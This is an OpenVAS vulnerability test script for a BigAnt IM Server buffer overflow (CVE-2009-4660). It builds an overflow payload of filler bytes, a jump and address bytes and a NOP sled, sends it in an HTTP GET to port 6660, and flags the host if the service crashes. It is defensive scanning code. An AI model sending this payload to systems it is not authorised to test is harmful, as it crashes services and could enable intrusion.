###############################################################################
# OpenVAS Vulnerability Test
# $Id: BigAnt_36407.nasl 13211 2019-01-22 09:22:34Z cfischer $
#
# BigAnt IM Server HTTP GET Request Buffer Overflow Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100278");
  script_version("$Revision: 13211 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-22 10:22:34 +0100 (Tue, 22 Jan 2019) $");
  script_tag(name:"creation_date", value:"2009-10-01 18:57:31 +0200 (Thu, 01 Oct 2009)");
  script_bugtraq_id(36407);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2009-4660");
  script_name("BigAnt IM Server HTTP GET Request Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Buffer overflow");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("BigAnt_detect.nasl");
  script_require_ports("Services/BigAnt", 6660);
  script_mandatory_keys("bigant/server/detected");

  script_tag(name:"summary", value:"BigAnt IM Server is prone to a remote buffer-overflow vulnerability
  because it fails to perform adequate boundary checks on user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code with the
  privileges of the user running the server. Failed exploit attempts will result in a denial-of-service condition.");

  script_tag(name:"affected", value:"BigAnt IM Server 2.50 is vulnerable. Other versions may also be
  affected.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"Updates are available. Please contact the vendor for details.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/36407");
  script_xref(name:"URL", value:"http://www.bigantsoft.com");
  exit(0);
}

include("http_func.inc");

port = get_kb_item("Services/BigAnt");
if(!port) port = 6660;
if(!get_port_state(port))exit(0);

payload =  crap(data:raw_string(0x41), length: 985);
payload += raw_string(0xeb,0x06,0x90,0x90,0x6a,0x19,0x9a,0x0f);
payload += crap(data:raw_string(0x90),length: 10);

soc = open_sock_tcp(port);
if(!soc)exit(0);

req = string("GET ", payload, "\r\n\r\n");
send(socket:soc, data:req);
if(http_is_dead(port: port)) {
  security_message(port:port);
  exit(0);
}

exit(0);